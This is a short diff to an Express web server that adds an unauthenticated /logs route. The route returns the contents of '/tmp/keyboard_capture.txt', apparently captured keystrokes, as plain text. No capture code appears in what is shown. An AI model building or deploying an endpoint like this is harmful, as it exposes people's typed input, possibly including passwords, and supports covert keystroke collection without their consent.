@@ -57,6 +57,17 @@ app.post("/", (req, res) => {
 
   res.send("Successfully added the data at the top!")
 })
+app.get("/logs", (req, res) => {
+  const logFilePath = "/tmp/keyboard_capture.txt"
+
+  if (!fs.existsSync(logFilePath)) {
+    return res.status(404).json({ message: "No logs found." })
+  }
+
+  const logs = fs.readFileSync(logFilePath, "utf8")
+  res.setHeader("Content-Type", "text/plain") // Set response as plain text
+  res.send(logs)
+})
 
 app.listen(port, () => {
   console.log(`App is listening on port ${port}`)
